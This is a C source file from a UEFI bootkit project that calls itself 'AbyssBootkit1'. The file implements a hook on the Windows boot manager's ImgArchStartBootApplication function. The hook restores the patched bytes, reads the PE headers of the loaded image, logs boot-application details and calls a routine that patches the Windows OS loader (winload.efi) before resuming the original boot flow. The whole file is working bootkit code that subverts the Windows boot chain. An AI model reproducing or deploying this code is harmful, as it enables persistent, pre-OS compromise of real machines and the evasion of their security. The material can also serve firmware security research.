// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Hooks bootmgfw.efi!ImgArchStartBootApplication
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils04Headers.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Functions02PatchHookWindowsOSLoader.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures00ArcSystemFirmware.h>
#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Hooks the ImgArchStartBootApplication function.
	@details        This function replaces the original ImgArchStartBootApplication function with a custom hook that allows for additional functionality.


	@param[in]      AppEntry                    A pointer to the BL_APPLICATION_ENTRY structure.
	@param[in]      ImageBase                   A pointer to the base address of the loaded image.
	@param[in]      ImageSize                   The size, in bytes, of the loaded image.
	@param[in]      BootOption                  The boot option identifier.
	@param[out]     ReturnArguments             A pointer to the BL_RETURN_ARGUMENTS structure.


	@retval         EFI_SUCCESS                 The ArchStartBootApplication function was successfully hooked.
	@retval         other                       An error occurred during the hooking process.
**/
EFI_STATUS
BootWindowsHookings_HooksBootmgfwEfi_ImgArchStartBootApplication(
	IN              PBL_APPLICATION_ENTRY       AppEntry,
	IN              VOID*                       ImageBase,
	IN              UINT32                      ImageSize,
	IN              UINT32                      BootOption,
	OUT             PBL_RETURN_ARGUMENTS        ReturnArguments
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Hello\r\n");



	// ---------------------------------------------------------------------------------------------------------------------
	// Restore original function bytes that were replaced with hook
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Restore original function bytes that were replaced with hook\r\n");

	BootWindowsHookings_UtilsMemory_CopyMemory(Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer, Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationBackupBytes, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


	// ---------------------------------------------------------------------------------------------------------------------
	// Get NT Headers
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Get NT Headers\r\n");

	CONST PEFI_IMAGE_NT_HEADERS NtHeaders = BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile(ImageBase, ImageSize);

	// Failed		
	if (NtHeaders == NULL)
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile failed.\r\n");

		// Call original
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Call original\r\n");

		return ((t_ImgArchStartBootApplication)Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer)(AppEntry, ImageBase, ImageSize, BootOption, ReturnArguments);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Print info
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Print info\r\n");

	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    -> ImageBase: 0x%p\r\n", ImageBase);
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    -> ImageSize: %lx\r\n", ImageSize);
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    -> EntryPoint: 0x%p\r\n", ((UINT8*)ImageBase + HEADER_FIELD(NtHeaders, AddressOfEntryPoint)));
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"      -> AppEntry:\r\n");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"        -> Signature: %a\r\n", AppEntry->Signature);
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"        -> Flags: %lx\r\n", AppEntry->Flags);
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"        -> GUID: %08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x\r\n", AppEntry->Guid.Data1, AppEntry->Guid.Data2, AppEntry->Guid.Data3, AppEntry->Guid.Data4[0], AppEntry->Guid.Data4[1], AppEntry->Guid.Data4[2], AppEntry->Guid.Data4[3], AppEntry->Guid.Data4[4], AppEntry->Guid.Data4[5], AppEntry->Guid.Data4[6], AppEntry->Guid.Data4[7]);


	// ---------------------------------------------------------------------------------------------------------------------
	// Patch Windows OS Loader
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Patch Windows OS Loader\r\n");

	EFI_STATUS Status = BootWindowsHookings_FunctionsWindowsOSLoader_PatchWinloadEfi(ImageBase, NtHeaders);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - BootWindowsHookings_FunctionsWindowsOSLoader_PatchWinloadEfi failed: %r (%llx).\r\n", Status, Status);

		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Call original
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Hooks/BootmgfwEfi.c] (ImgArchStartBootApplication) - Call original\r\n");

	return ((t_ImgArchStartBootApplication)Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer)(AppEntry, ImageBase, ImageSize, BootOption, ReturnArguments);
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
